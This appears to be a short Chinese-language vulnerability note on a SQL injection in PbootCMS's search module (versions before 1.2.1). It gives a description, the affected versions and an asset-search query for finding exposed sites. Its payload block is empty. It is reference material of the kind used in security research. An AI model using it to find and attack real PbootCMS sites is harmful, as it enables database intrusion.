# PbootCMS search SQL注入漏洞

## 漏洞描述

PbootCMS 搜索模块存在SQL注入漏洞。通过漏洞可获取数据库敏感信息

## 漏洞影响

```
PbootCMS < 1.2.1
```

## 网络测绘 

```
app="PBOOTCMS"
```

## 漏洞复现

搜索框页面为

![](./images/202202170924485.png)Payload为

```plain

```
